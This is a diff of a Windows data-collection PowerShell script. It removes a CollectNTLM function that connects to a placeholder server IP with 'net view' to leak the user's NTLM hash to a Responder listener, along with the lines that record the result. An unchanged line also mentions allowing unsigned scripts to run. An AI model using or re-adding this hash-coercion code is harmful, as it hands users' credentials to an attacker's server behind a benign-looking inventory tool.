@@ -1,5 +1,5 @@
 #Small script to collect some windows data.
-#Version 1.4.0
+#Version 1.4.3
 
 try{
 	#Allow running unsigned scripts as current user
@@ -177,7 +177,6 @@ Write-Host "Collecting info about antivirus."
 # than just product name.
 $avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct |
     Select-Object displayName, instanceGuid, pathToSignedProductExe, pathToSignedReportingExe, productState, timestamp
-$responder = CollectNTLM
 
 
 Write-Host "Processing collected data."
@@ -205,7 +204,6 @@ $collectedData | Add-Member -MemberType NoteProperty -Name Non_standard_win_serv
 $collectedData | Add-Member -MemberType NoteProperty -Name Non_MS_scheduled_tasks -Value $nonMSScheduledTasks
 $collectedData | Add-Member -MemberType NoteProperty -Name Firewall -Value $firewallStatus
 $collectedData | Add-Member -MemberType NoteProperty -Name Antivirus -Value $avProducts
-$collectedData | Add-Member -MemberType NoteProperty -Name Responder -Value $responder
 
 # Add a per-product NoteProperty for each registered AV. SecurityCenter2
 # can return more than one entry with the same displayName (stale
@@ -519,33 +517,6 @@ return $tenantId
 
 return "Not joined."
 }
-
-function CollectNTLM {
-    $resolved = "{{SERVER_IP}}"
-
-    if (-not $resolved) {
-        return "Server IP not configured."
-    }
-
-    Write-Host "Collecting NTLM hash by connecting to \\$resolved..."
-
-    $output = net view "\\$resolved" 2>&1
-    $text   = $output -join "`n"
-
-    if ($text -match "System error (\d+)") {
-        $code = [int]$matches[1]
-
-        if ($code -eq 5) {
-            return "Hash sent to responder, exit code $code"
-        } else {
-            return "Hash not sent to responder, exit code $code"
-        }
-    }
-
-    return "Unexpected response from net view."
-}
-
-
 
 function Check-WhoJoinedAzure {
 
